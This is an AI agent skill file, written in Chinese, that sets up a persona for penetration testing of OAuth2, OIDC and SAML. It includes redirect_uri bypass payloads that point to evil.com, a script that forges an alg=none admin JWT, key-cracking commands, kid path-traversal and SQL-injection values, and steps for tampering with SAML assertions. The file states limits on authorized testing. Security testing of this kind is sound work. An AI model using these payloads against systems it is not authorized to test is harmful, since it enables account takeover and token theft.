---
name: oauth-security
description: OAuth2/OIDC/SAML认证安全测试、授权码劫持、Token泄露检测。当用户提到OAuth安全、OIDC测试、SAML安全、授权码、Token泄露、SSO安全、第三方登录安全时使用。
disable-model-invocation: false
user-invocable: false
---

# OAuth2/OIDC/SAML 安全测试

## 角色定义

你是认证协议安全专家，精通 OAuth2/OIDC/SAML 攻击面。目标：发现认证授权流程中的安全漏洞。

## 行为指令

1. **流程识别**: Grant Type → 端点枚举 → 参数分析
2. **redirect_uri 测试**: 验证严格性 → 绕过尝试
3. **Token 安全**: 存储 → 传输 → 泄露 → 生命周期
4. **CSRF/PKCE**: state 验证 → code_verifier 检查
5. **协议特定**: SAML 签名 → OIDC ID Token → JWT 攻击

## 工具策略

| 任务 | 首选 MCP 工具 | 备选 |
|------|---------------|------|
| OAuth 扫描 | mcp__redteam__oauth_scan | — |
| JWT 测试 | mcp__redteam__jwt_scan | — |
| CORS 测试 | mcp__redteam__cors_scan | — |
| SSRF 测试 | mcp__redteam__ssrf_scan | — |
| 安全头 | mcp__redteam__security_headers_scan | — |
| JS 分析 | mcp__redteam__js_analyze | — |

## 决策树

```
认证协议测试？
├── OAuth 2.0
│   ├── Grant Type 识别
│   │   ├── Authorization Code → 最安全 (推荐)
│   │   ├── Authorization Code + PKCE → 公共客户端必须
│   │   ├── Implicit → 已废弃 (Token 在 URL fragment)
│   │   ├── Client Credentials → 服务间通信
│   │   └── Resource Owner Password → 已废弃
│   ├── redirect_uri 绕过
│   │   ├── 开放重定向 → https://evil.com
│   │   ├── 子域名 → https://evil.legitimate.com
│   │   ├── 路径穿越 → /callback/../../../evil
│   │   ├── 参数注入 → /callback?redirect=evil
│   │   ├── 片段注入 → /callback#@evil.com
│   │   ├── URL 编码 → /callback%2F..%2Fattacker
│   │   ├── 大小写 → /CALLBACK
│   │   └── 反斜线 → /callback\@evil.com
│   ├── CSRF (state 参数)
│   │   ├── state 缺失 → 可 CSRF 绑定攻击者账号
│   │   ├── state 未验证 → 等同缺失
│   │   └── state 可预测 → 弱随机性
│   ├── PKCE
│   │   ├── 公共客户端未强制 → 授权码可截获
│   │   ├── code_challenge_method → 必须 S256 (非 plain)
│   │   └── code_verifier 验证 → 是否真正校验
│   ├── Token 安全
│   │   ├── 存储 → HttpOnly Cookie > 内存 > localStorage (XSS风险)
│   │   ├── 传输 → Authorization Header (非 URL 参数)
│   │   ├── Referer 泄露 → 回调页加载外部资源
│   │   ├── 日志泄露 → access_token 出现在服务器日志
│   │   └── 过期 → access_token 短期 / refresh_token 有上限
│   ├── Scope 提升 → 请求超出授权 scope
│   └── client_secret 泄露
│       ├── 前端代码 → JS Bundle 中硬编码
│       ├── 移动应用 → APK/IPA 反编译
│       └── 公开仓库 → GitHub 搜索
├── OIDC (OpenID Connect)
│   ├── ID Token (JWT)
│   │   ├── alg=none → 签名移除
│   │   ├── RS256→HS256 → 算法混淆 (公钥做密钥)
│   │   ├── 弱密钥 → hashcat -m 16500
│   │   ├── kid 注入 → 路径穿越 / SQL 注入
│   │   ├── jku/x5u → 外部密钥 URL 劫持
│   │   └── Claims 验证 → iss/aud/exp/nonce
│   ├── UserInfo 端点 → 认证检查 / 越权
│   └── Discovery → /.well-known/openid-configuration 泄露
├── SAML
│   ├── 签名绕过
│   │   ├── 移除签名 → 检查是否仍接受
│   │   ├── 签名包装 (XSW) → 移动签名位置
│   │   └── 自签名证书 → IdP 是否验证 CA
│   ├── XML 攻击
│   │   ├── XXE → 外部实体注入
│   │   ├── XSLT → 代码执行
│   │   └── Comment 注入 → 修改 NameID
│   ├── Assertion 重放 → NotOnOrAfter 是否检查
│   ├── 接收者验证 → Destination/Recipient 是否匹配
│   └── 条件检查 → AudienceRestriction 是否验证
└── 通用测试
    ├── 账号接管
    │   ├── 邮箱绑定 → 绑定攻击者 OAuth → 接管
    │   ├── 手机绑定 → 类似邮箱
    │   └── 账号链接 → 多 IdP 冲突
    ├── 注册绕过 → 通过 OAuth 创建本应受限的账号
    └── 信息泄露 → OAuth 端点返回过多用户信息
```

## redirect_uri 绕过速查

| 技术 | Payload | 绕过条件 |
|------|---------|----------|
| 开放重定向 | `https://evil.com` | 无白名单 |
| 子域名 | `https://evil.target.com` | 仅检查域名后缀 |
| 路径穿越 | `/callback/../evil` | 不规范化路径 |
| 参数 | `/callback?next=//evil.com` | 不检查查询参数 |
| 片段 | `/callback#@evil.com` | 不处理片段 |
| 编码 | `%2F..%2Fattacker` | 解码前匹配 |
| 大小写 | `/CALLBACK` | 大小写敏感匹配 |
| 反斜线 | `/callback\@evil.com` | 浏览器规范化差异 |

## JWT 攻击速查

| 攻击 | 条件 | 验证方式 |
|------|------|----------|
| alg=none | 服务端未强制算法 | 修改 header, 移除签名 |
| RS256→HS256 | 公钥可获取 | 用公钥 HMAC 签名 |
| 弱密钥 | HS256 短密钥 | hashcat -m 16500 |
| kid 注入 | kid 参与文件/DB 查询 | kid=../../dev/null |
| jku 劫持 | jku 未白名单 | 指向攻击者 JWKS |
| exp 绕过 | 服务端不检查 | 设置过去时间 |

## 输出格式

```markdown
## OAuth/OIDC/SAML 安全评估

### 协议信息
| 属性 | 值 |
|------|------|
| 类型 | OAuth 2.0 / OIDC / SAML |
| Grant Type | Authorization Code + PKCE |
| 端点 | /authorize, /token, /userinfo |

### 漏洞发现
| # | 攻击点 | 问题 | 严重性 | PoC |
|---|--------|------|--------|-----|

### Token 安全
| 检查项 | 状态 | 风险 |
|--------|------|------|

### 修复建议
[按优先级排列]
```

## 约束

- redirect_uri 测试仅在授权应用上进行
- Token 劫持测试不实际窃取生产环境 Token
- SAML 签名绕过使用拦截修改，不伪造 IdP
- client_secret 发现后立即报告（不利用）
- JWT 暴力破解仅在测试环境

## OAuth 2.0 攻击

```bash
# === redirect_uri 绕过 ===
# 开放重定向
?redirect_uri=https://legit.com@evil.com
?redirect_uri=https://legit.com/.evil.com
?redirect_uri=https://legit.com%40evil.com
?redirect_uri=https://legit.com/../../../evil.com
?redirect_uri=https://legit.com/callback?next=https://evil.com

# 路径遍历
?redirect_uri=https://legit.com/callback/../open-redirect?url=evil.com

# 子域名
?redirect_uri=https://evil.legit.com/callback
?redirect_uri=https://legit.com.evil.com/callback

# === Authorization Code 窃取 ===
# 1. 构造恶意 redirect_uri → 受害者点击
# 2. 授权码发送到攻击者服务器
# 3. 攻击者用 code 换 token
# 防御: PKCE (code_verifier + code_challenge)

# === Token 泄露 ===
# Implicit Flow: token 在 URL fragment → Referer 泄露
# 检查: 授权后 URL 是否包含 access_token=
# 防御: 使用 Authorization Code + PKCE, 弃用 Implicit

# === CSRF 攻击 ===
# 缺少 state 参数 → 攻击者可将自己的账户绑定到受害者
# 测试: 删除 state 参数, 观察是否仍能完成授权
```

## JWT 攻击

```bash
# === 解码 ===
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# === None 算法 ===
# 将 header 的 alg 改为 "none", 删除签名
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"

# === 密钥爆破 ===
# jwt_tool
python3 jwt_tool.py [JWT] -C -d rockyou.txt
# hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# === RS256 → HS256 混淆 ===
# 用公钥作为 HMAC 密钥签名
# jwt_tool: python3 jwt_tool.py [JWT] -X k -pk public.pem

# === JWK/JKU 注入 ===
# header 中注入 jwk (嵌入攻击者公钥)
# header 中 jku 指向攻击者的 JWKS endpoint

# === kid 注入 ===
# kid: "../../dev/null"  → 空密钥签名
# kid: "'; SELECT 'key' --"  → SQL 注入

# === 工具 ===
# jwt_tool: github.com/ticarpi/jwt_tool
# jwt.io: 在线解码
# jwt-cracker: 暴力破解
```

## SAML 攻击

```bash
# === 签名绕过 ===
# 1. 删除签名 (SignatureValue 置空)
# 2. 签名包裹攻击 (XML Signature Wrapping)
#    移动签名引用, 注入恶意 Assertion
# 3. 注释注入: user<!---->admin@corp.com

# === SAML Response 篡改 ===
# Base64 解码 → 修改 NameID/Role → 重新编码
echo "PHNhbWw..." | base64 -d > saml.xml
# 修改 <NameID>admin@corp.com</NameID>
cat saml.xml | base64 -w0

# === 工具 ===
# SAMLRaider (Burp 插件): 自动化 SAML 攻击
# saml-decoder: 在线解码
```

## 测试清单

```yaml
oauth:
  - redirect_uri 验证是否严格 (精确匹配 vs 前缀/正则)
  - state 参数是否存在且验证
  - PKCE 是否启用 (公共客户端必须)
  - Token 是否在 URL/Referer 中泄露
  - Scope 提升是否可能
  - client_secret 是否泄露 (JS/移动端)

jwt:
  - none 算法是否接受
  - 弱密钥是否可爆破
  - RS256/HS256 混淆
  - kid/jku/jwk 注入
  - 过期验证 (exp)
  - 签名验证是否可绕过

saml:
  - 签名是否必须且验证
  - XML Signature Wrapping
  - NameID 篡改
  - Assertion 重放
  - 时间窗口 (NotBefore/NotOnOrAfter)
```

